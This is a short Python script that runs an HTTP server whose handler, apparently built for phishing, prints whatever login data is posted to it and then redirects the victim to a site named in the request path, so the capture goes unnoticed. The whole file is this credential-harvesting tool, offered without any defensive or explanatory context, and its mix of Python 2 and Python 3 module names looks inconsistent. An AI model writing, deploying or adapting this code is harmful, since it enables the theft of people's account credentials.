import SimpleHTTPServer
import socketserver
import urllib

class CredintialReqHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers['Content-length'])
        creds = self.rfile.read(content_length).decode('utf-8')
        print creds
        site = self.path[1:]
        self.send_response(301)
        self.send_header('Location', urllib.unquote(site))
        self.end_headers()

server = socketserver.TCPServer(('0.0.0.0', 8080), CredintialReqHandler)
server.serve_forever()